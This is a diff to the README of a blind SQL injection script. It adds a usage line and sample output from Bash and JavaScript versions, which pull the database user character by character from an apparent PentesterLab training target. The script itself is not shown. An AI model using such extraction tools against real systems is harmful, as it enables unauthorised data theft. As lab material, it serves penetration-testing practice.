@@ -12,7 +12,7 @@ This script requires heavy editing. You have to use Burpsuite to test the SQLI p
 
 `./SQLblind.sh 20 'system_user()'`
 
-## Sample output
+## Output for Bash script
 ```
 root@Kali:~/Web# ./SQLblind.sh 30 'system_user()'
 Edit the $URL,$truestring and curl command before you use it. Basically change almost everything :) 
@@ -44,4 +44,32 @@ Character number 21 found: S
 Character number 22 found: T
 Results: PENTESTERLAB@LOCALHOST
 
+```
+## Output for JS script
+Tested on Chrome console
+```
+Extracting results from query system_user()...
+Character number 1 found: p
+Character number 2 found: e
+Character number 3 found: n
+Character number 4 found: t
+Character number 5 found: e
+Character number 6 found: s
+Character number 7 found: t
+Character number 8 found: e
+Character number 9 found: r
+Character number 10 found: l
+Character number 11 found: a
+Character number 12 found: b
+Character number 13 found: @
+Character number 14 found: l
+Character number 15 found: o
+Character number 16 found: c
+Character number 17 found: a
+Character number 18 found: l
+Character number 19 found: h
+Character number 20 found: o
+Character number 21 found: s
+Character number 22 found: t
+Results: pentesterlab@localhost
 ```
